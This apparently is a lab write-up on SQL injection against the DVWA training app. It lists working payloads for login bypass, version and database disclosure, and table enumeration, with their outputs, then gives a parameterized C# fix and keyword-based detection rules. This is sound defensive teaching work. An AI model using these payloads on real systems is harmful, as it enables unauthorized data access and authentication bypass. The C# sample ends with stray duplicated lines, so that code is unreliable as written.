@@ -1,0 +1,196 @@
+//1. Exploit Phase
+SQL Injection Testing Results
+Environment: DVWA – SQL Injection (User ID Input Field)
+ 
+During testing of the User ID input field, multiple SQL injection payloads were entered to determine whether user input was being safely handled or directly concatenated into database queries. The following payloads successfully executed, confirming that the application is vulnerable to SQL injection.
+ 
+Test 1 – Authentication bypass using always-true condition
+Payload:
+' OR '1'='1
+ 
+Result:
+ID: 1 OR 1=1
+First name: admin
+Surname: admin
+ 
+This payload forced the WHERE clause to evaluate as true, which returned the admin account and bypassed normal query filtering.
+ 
+Test 2 – Numeric always-true condition
+Payload:
+1 OR 1=1
+ 
+Result:
+ID: 1 OR 1=1
+First name: admin
+Surname: admin
+ 
+This produced the same result as the previous test. Because 1=1 is always true, the database returned the first available user record.
+ 
+Test 3 – Database version disclosure
+Payload:
+' UNION SELECT 1,version() --
+ 
+Result:
+ID: ' UNION SELECT 1,version() --
+First name: 1
+Surname: 11.8.3-MariaDB-1+b1 from Debian
+ 
+This UNION query successfully retrieved the database server version, demonstrating that arbitrary data can be extracted from the system.
+ 
+Test 4 – Database name disclosure
+Payload:
+' UNION SELECT 1,database() --
+ 
+Result:
+ID: ' UNION SELECT 1,database() --
+First name: 1
+ 
+This query returned the current database name, confirming further information disclosure.
+ 
+Test 5 – Table enumeration
+Payload:
+' UNION SELECT 1,table_name FROM information_schema.tables --
+ 
+Result:
+ID: ' UNION SELECT 1,table_name FROM information_schema.tables --
+First name: 1
+Surname: ALL_PLUGINS
+ 
+This query enumerated table names from the information schema, demonstrating that database structure information can be accessed.
+ 
+Summary:
+The User ID input field is vulnerable to SQL injection. Multiple payloads allowed authentication bypass, database version disclosure, database identification, and table enumeration. These results indicate that user input is being directly inserted into SQL statements without proper validation or parameterization. The issue can be mitigated by using parameterized queries or prepared statements to ensure user input is treated strictly as data rather than executable SQL.
+ 
+ 
+ 
+ 
+//2. Remediation Phase
+//language C#
+ 
+// Example: NON-parameterized query (vulnerable to SQL Injection)
+ 
+string sqlUnsafe = "SELECT * FROM users WHERE user_id = " + id;
+ 
+ 
+// Example: Parameterized query (safe)
+ 
+// Uses MySqlConnector library to talk to a MySQL/MariaDB database
+using MySqlConnector;
+ 
+public static void GetUserById(int userId, string connectionString)
+{
+    // STEP 1 — Define the SQL query
+    // Notice we use @id as a placeholder instead of inserting the value directly
+    // This prevents user input from being executed as SQL code
+    string sql = "SELECT first_name, last_name FROM users WHERE user_id = @id";
+ 
+ 
+    // STEP 2 — Create a database connection
+    // "using" automatically closes the connection when finished (good practice)
+    using var conn = new MySqlConnection(connectionString);
+ 
+    // Open the connection to the database
+    conn.Open();
+ 
+ 
+    // STEP 3 — Create the command (query + connection together)
+    using var cmd = new MySqlCommand(sql, conn);
+ 
+ 
+    // STEP 4 — Add parameter safely
+    // The value is sent separately from the SQL text
+    // The database treats this as DATA ONLY, not executable SQL
+    // This blocks inputs like: 1 OR 1=1 --
+    cmd.Parameters.AddWithValue("@id", userId);
+ 
+ 
+    // STEP 5 — Execute the query
+    // Returns a reader to loop through results
+    using var reader = cmd.ExecuteReader();
+ 
+ 
+    // STEP 6 — Read each returned row
+    while (reader.Read())
+    {
+        // Get column values safely from the result set
+        string first = reader["first_name"]?.ToString() ?? "";
+        string last  = reader["last_name"]?.ToString() ?? "";
+ 
+        // Output result
+        Console.WriteLine($"{first} {last}".Trim());
+    }
+}
+ 
+ 
+        Console.WriteLine($"{first} {last}".Trim());
+    }
+}
+ 
+ 
+ 
+1. Vulnerability Assessment
+ 
+1. Data Flow Mapping (User Input to Database Execution)
+Data Flow Overview
+User Browser
+  ↓
+HTTP Request (URL parameters or login form)
+  ↓
+DVWA PHP Application
+  ↓
+Dynamic SQL Query Construction
+  ↓
+MySQL Database Execution
+  ↓
+Results Returned to User 
+Explanation
+    User input is accepted through URL parameters and login form fields.
+    The application inserts this input directly into SQL queries.
+    No validation, sanitization, or parameterized queries are used.
+    This allows user input to alter SQL logic before execution.
+    ⚠️ The trust boundary between the user and the database is broken.
+2. Injection Point Identification
+    Injection Point 1: URL Parameter
+    Location
+    URL ID parameter (e.g., id=)
+    Payload Used
+    ' OR '1'='1 
+    Resulting SQL Logic (Conceptual)
+    SELECT first_name, last_name FROM usersWHERE id = '' OR '1'='1';
+    Observed Outcome
+    The condition '1'='1' always evaluates as true
+    The database returns all rows from the users table
+    Evidence
+    Multiple user records (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith) were displayed from a single request
+Injection Point 2: Login Field
+    Location
+    Login form (username and/or password field)
+    Payload Used
+    ' OR '1'='1 
+    Resulting SQL Logic (Conceptual)
+    SELECT * FROM usersWHERE username = '' OR '1'='1' AND password = '';
+    Observed Outcome
+    Authentication logic is bypassed
+    Access is granted without valid credentials
+3. CIA Triad Impact Analysis
+    Confidentiality
+    Impact
+    Unauthorized access to sensitive user data
+    Ability to enumerate all user records
+    Risk Level: High
+    Integrity
+    Impact
+    Attacker-controlled SQL logic
+    Potential to modify, insert, or delete database records
+    Risk Level: High
+    Availability
+    Impact
+    Potential database disruption
+    Injection could be extended to resource exhaustion or destructive queries
+    Risk Level: Medium
+ 
+ 
+Security Control Analysis - 
+To effectively detect SQL injection attempts, organizations should implement monitoring of user input for common SQL-related keywords such as SELECT, UNION, OR, and DROP. These keywords should not normally appear in URL parameters or form fields, and their presence may indicate an attempted SQL injection attack. Logging and alerting on these patterns helps identify malicious activity early.
+ 
+Organizations should also implement detection of special characters commonly associated with SQL injection, including single quotes ('), comment symbols (--, /* */), and semicolons (;). The appearance of these characters in input fields—particularly numeric fields such as user ID parameters—should be treated as suspicious and reviewed as potential indicators of attack.
